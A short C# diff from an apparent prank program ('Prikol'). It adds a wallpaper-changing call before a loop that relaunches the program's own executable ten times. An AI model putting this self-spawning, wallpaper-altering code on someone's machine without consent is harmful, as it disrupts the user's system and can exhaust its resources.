@@ -31,6 +31,7 @@ namespace Prikol
         {
             if (arg == 0)
             {
+                ChangeWallpaper();
                 for (var i = 0; i < 10; i++) Process.Start(new ProcessStartInfo()
                 {
                     FileName = $"{Application.ExecutablePath}",
